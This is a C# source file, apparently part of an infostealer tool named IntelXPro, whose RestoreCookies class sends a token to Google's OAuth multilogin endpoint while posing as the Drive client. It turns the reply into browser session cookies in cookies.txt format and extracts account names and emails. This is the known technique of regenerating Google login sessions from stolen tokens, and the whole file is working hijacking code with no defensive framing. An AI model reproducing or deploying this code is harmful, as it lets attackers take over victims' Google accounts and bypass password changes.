using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;



namespace IntelXPro.src.IntelXPro.Dependencies.General
{
    public static class RestoreCookies
    {
        public class Account
        {
            public string type { get; set; }

            public string display_name { get; set; }

            public string display_email { get; set; }

            public string photo_url { get; set; }

            public bool selected { get; set; }

            public bool default_user { get; set; }

            public int authuser { get; set; }

            public bool valid_session { get; set; }

            public string obfuscated_id { get; set; }

            public bool is_verified { get; set; }
        }

        public class Cookie
        {
            public string name { get; set; }

            public string value { get; set; }

            public string domain { get; set; }

            public string path { get; set; }

            public bool isSecure { get; set; }

            public bool isHttpOnly { get; set; }

            public int maxAge { get; set; }

            public string priority { get; set; }

            public string sameParty { get; set; }

            public string sameSite { get; set; }

            public string host { get; set; }
        }

        public class Root
        {
            public string status { get; set; }

            public List<Cookie> cookies { get; set; }

            public List<Account> accounts { get; set; }
        }

        private static string SendPostRequest(string token)
        {
            try
            {
                HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("https://accounts.google.com/oauth/multilogin?source=com.google.Drive");
                httpWebRequest.Method = "POST";
                httpWebRequest.ContentType = "application/x-www-form-urlencoded";
                httpWebRequest.Headers.Add("Authorization", "MultiBearer " + token);
                httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/605.1.15 (KHTML, like Gecko) com.google.Drive/6.0.230903 iSL/3.4 (gzip)\r\n";
                string s = "";
                byte[] bytes = Encoding.UTF8.GetBytes(s);
                using (Stream stream = httpWebRequest.GetRequestStream())
                {
                    stream.Write(bytes, 0, bytes.Length);
                }
                using (HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse())
                {
                    if (httpWebResponse.StatusCode == HttpStatusCode.OK)
                    {
                        using (StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream()))
                        {
                            return streamReader.ReadToEnd();
                        }
                    }
                }
            }
            catch (Exception)
            {
            }
            return string.Empty;
        }

        public static string CRestore(string restore)
        {
            try
            {
                string text = SendPostRequest(restore);
                if (string.IsNullOrEmpty(text))
                {
                    return string.Empty;
                }
                text = text.Remove(0, 5);
                Root obj = new Root
                {
                    status = Regex.Match(text, "\"status\":\"(.*?)\"").Groups[1].Value,
                    cookies = ExtractCookies(text),
                    accounts = ExtractAccounts(text)
                };
                StringBuilder stringBuilder = new StringBuilder();
                foreach (Cookie cookie in obj.cookies)
                {
                    string text2 = (string.IsNullOrEmpty(cookie.host) ? cookie.domain : cookie.host);
                    text2 = (string.IsNullOrEmpty(text2) ? ".google.com" : text2);
                    stringBuilder.AppendLine(text2 + "\tTRUE\t" + cookie.path + "\tFALSE\t" + cookie.maxAge + "\t" + cookie.name + "\t" + cookie.value);
                }
                return stringBuilder.ToString();
            }
            catch
            {
            }
            return string.Empty;
        }

        private static List<Cookie> ExtractCookies(string json)
        {
            List<Cookie> list = new List<Cookie>();
            foreach (Match item2 in Regex.Matches(json, "{(.*?)}"))
            {
                string value = item2.Value;
                int result;
                Cookie item = new Cookie
                {
                    name = Regex.Match(value, "\"name\":\"(.*?)\"").Groups[1].Value,
                    value = Regex.Match(value, "\"value\":\"(.*?)\"").Groups[1].Value,
                    domain = Regex.Match(value, "\"domain\":\"(.*?)\"").Groups[1].Value,
                    path = Regex.Match(value, "\"path\":\"(.*?)\"").Groups[1].Value,
                    isSecure = Regex.IsMatch(value, "\"isSecure\":true"),
                    isHttpOnly = Regex.IsMatch(value, "\"isHttpOnly\":true"),
                    maxAge = (int.TryParse(Regex.Match(value, "\"maxAge\":(\\d+)").Groups[1].Value, out result) ? result : 0),
                    priority = Regex.Match(value, "\"priority\":\"(.*?)\"").Groups[1].Value,
                    sameParty = Regex.Match(value, "\"sameParty\":\"(.*?)\"").Groups[1].Value,
                    sameSite = Regex.Match(value, "\"sameSite\":\"(.*?)\"").Groups[1].Value,
                    host = Regex.Match(value, "\"host\":\"(.*?)\"").Groups[1].Value
                };
                list.Add(item);
            }
            return list;
        }

        private static List<Account> ExtractAccounts(string json)
        {
            List<Account> list = new List<Account>();
            foreach (Match item2 in Regex.Matches(json, "{(.*?)}"))
            {
                string value = item2.Value;
                int result;
                Account item = new Account
                {
                    type = Regex.Match(value, "\"type\":\"(.*?)\"").Groups[1].Value,
                    display_name = Regex.Match(value, "\"display_name\":\"(.*?)\"").Groups[1].Value,
                    display_email = Regex.Match(value, "\"display_email\":\"(.*?)\"").Groups[1].Value,
                    photo_url = Regex.Match(value, "\"photo_url\":\"(.*?)\"").Groups[1].Value,
                    selected = Regex.IsMatch(value, "\"selected\":true"),
                    default_user = Regex.IsMatch(value, "\"default_user\":true"),
                    authuser = (int.TryParse(Regex.Match(value, "\"authuser\":(\\d+)").Groups[1].Value, out result) ? result : 0),
                    valid_session = Regex.IsMatch(value, "\"valid_session\":true"),
                    obfuscated_id = Regex.Match(value, "\"obfuscated_id\":\"(.*?)\"").Groups[1].Value,
                    is_verified = Regex.IsMatch(value, "\"is_verified\":true")
                };
                list.Add(item);
            }
            return list;
        }
    }
}
